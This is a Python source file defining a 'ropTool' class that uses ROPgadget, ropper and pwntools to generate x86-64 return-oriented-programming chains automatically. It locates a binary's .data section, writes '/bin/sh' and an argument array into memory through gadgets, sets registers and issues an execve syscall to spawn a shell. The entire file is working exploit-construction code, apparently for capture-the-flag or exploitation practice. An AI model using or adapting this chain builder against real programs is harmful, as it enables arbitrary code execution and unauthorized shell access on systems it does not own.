from invoke import run
from ropper import RopperService
from pwn import *


class ropTool:
	def __init__(self, binary, data_address = ''):
		self.binary = binary
		self.code = ["chain = ''",]
		self.gadget = {}
		self.data_address = data_address
		self.payload = b''
		self.gadget_used=[]

	def getGadget(self):
		gadget_file = self.binary + "_gadgets.txt"
		cmd = "ROPgadget --binary "+ self.binary + " > " + gadget_file
		result = run(cmd, hide = True, warn=True)
		self.gadgets ={}
		fp = open(gadget_file,'rb')
		while True:
			line = fp.readline()
			if not line:
			 	break
			if line[-7:-2] == b'; ret':
				address = '0x' + line.split(b" : ")[0].decode()[12:]
				self.gadgets[address] = line.split(b" : ")[1].decode()
		fp.close()
		return self.gadgets

	def getDataSection(self):
		cmd = "readelf -S "+ self.binary +" > elf1.txt"
		result = run(cmd, hide = True, warn=True)
		fp = open('elf1.txt','rb')
		while True:
			line = fp.readline()
			if b' .data ' in line:
				self.data_address = b'0x' + line[-27:-11]
				self.data_address = self.data_address.decode()
				break
		fp.close()
		return self.data_address

	def getAuxGadget(self, reg):
		aux_list = ['rbx', 'rbp', 'r12','r13','r14','r15','r11','rax', 'rsi', 'rdx', 'rdi', 'rcx', 'rsp']
		total_garbage = 0
		if reg in aux_list:
			for x in aux_list:
				for g in self.gadgets:
					if "pop "+reg+" ; "+"pop "+ x +" ; ret \n" == self.gadgets[g]:
						self.code.append("chain += p64(" + g + ")")
						self.payload += p64(int(g,16))
						self.gadget_used.append(self.gadgets[g])
						total_garbage +=1
						return total_garbage

		if reg in aux_list:
			for x in range(len(aux_list)-1):
				for g in self.gadgets:
					if "pop "+reg+" ; "+"pop "+aux_list[x]+ " ; "+"pop "+aux_list[x+1]+" ; ret \n" == self.gadgets[g]:
						self.code.append("chain += p64(" + g + ")")
						self.payload += p64(int(g,16))
						self.gadget_used.append(self.gadgets[g])
						total_garbage +=2
						return total_garbage



	def set_reg(self,data,mode,rax = 0, rsi = 0, rdx = 0, rdi = 0, rcx = 0 , rbp = 0, rsp = 0):
		if rax+rsi+rdx+rdi+rcx+rbp+rsp > 1:
			raise Exception("Only one register can be set at a time")
		elif rax == 1:
			reg = "rax"
		elif rsi == 1:
			reg = "rsi"
		elif rdx == 1:
			reg = "rdx"
		elif rdi == 1:
			reg = "rdi"
		elif rcx == 1:
			reg = "rcx"
		elif rbp == 1:
			reg = "rbp"
		elif rsp == 1:
			reg = "rsp"

		flag = 0
		aux = 0
		if mode != 3:
			for g in self.gadgets:
				if "pop "+reg+" ; ret \n" == self.gadgets[g]:
					self.code.append("chain += p64(" + g + ")")
					self.payload += p64(int(g,16))
					self.gadget_used.append(self.gadgets[g])
					flag += 1
			if flag != 1:
				aux = self.getAuxGadget(reg)
				# search aux gadgets

		if data != '' and mode == 1:
			p = data
			self.code.append("chain += b'" + str(data.decode())  + (8-len(data))*'\x00' + "'")
			self.payload += data + (8-len(data))*b'\x00'
			flag += 1
		elif data != '' and mode == 2:
			self.code.append("chain += p64(" + str(data) + ")")
			self.payload += p64(data)
			flag += 1
		elif data != '' and mode == 3:
			for g in self.gadgets:
				if "xor rax, rax ; ret \n" == self.gadgets[g]:
					self.code.append("chain += p64(" + g + ")")
					self.payload += p64(int(g,16))
					self.gadget_used.append(self.gadgets[g])
					flag += 1
		else:
			raise Exception('No value assigned!')			
		# rax = rsi = rdx = 0
		if aux != 0:
			for p in range(aux):
				self.code.append("chain += p64(0x41414141)")
				self.payload += p64(0x41414141)

		return self.code, self.payload	


		

	def writeToMemory(self, data, mode, addr):
		flag = 0
		c,p = self.set_reg(data=addr,mode=2,rsi=1)
		c,p = self.set_reg(data=data,mode=mode,rax=1)

		for g in self.gadgets:
			if "mov qword ptr [rsi], rax ; ret \n" == self.gadgets[g]:
				self.code.append("chain += p64(" + g + ")")
				self.payload += p64(int(g,16))
				self.gadget_used.append(self.gadgets[g])
				flag += 1

		if flag != 1:
			raise Exception("gadgets not found!")
		return self.code, self.payload



	def getShell(self):
		flag =0
		s,p = self.writeToMemory(data=b'/bin/sh',mode = 1, addr = int(self.data_address,16) )
		s,p = self.writeToMemory(data= int(self.data_address,16), addr=int(self.data_address,16)+8, mode = 2)
		s,p = self.writeToMemory(data= "0", addr=int(self.data_address,16)+16, mode = 3)
		s,p = self.set_reg(rdi=1,data=int(self.data_address,16),mode=2)
		s,p = self.set_reg(rsi=1,data=int(self.data_address,16)+8,mode=2)
		s,p = self.set_reg(rdx=1,data=int(self.data_address,16)+16,mode=2)
		# self.code.append("chain += p64(0x41414141)")
		# self.payload += p64(0x41414141)
		s,p = self.doSyscall("0x3b")

		flag += 1

		if flag != 1:
			raise Exception("gadgets not found!")
		return self.code, self.payload

	def getUsedGadget(self):
		return self.gadget_used

	def doSyscall(self, id):
		flag = 0;
		s,p = self.set_reg(rax=1,data=int(id,16),mode=2)
		for g in self.gadgets:
			if "syscall ; ret \n" == self.gadgets[g]:
				self.code.append("chain += p64(" + g + ")")
				self.payload += p64(int(g,16))
				self.gadget_used.append(self.gadgets[g])
				flag =1
				break;
		if flag!=1:
			rs = RopperService()
			rs.addFile(self.binary)
			rs.loadGadgetsFor()
			for f, g in rs.search('syscall; ret'):
				line = str(g)
				address = '0x' + line.split(": ")[0][12:]
				self.gadgets[address] = line.split(": ")[1]
				self.code.append("chain += p64(" + address + ")")
				self.payload += p64(int(address,16))
				self.gadget_used.append(self.gadgets[address])
		return self.code, self.payload




		

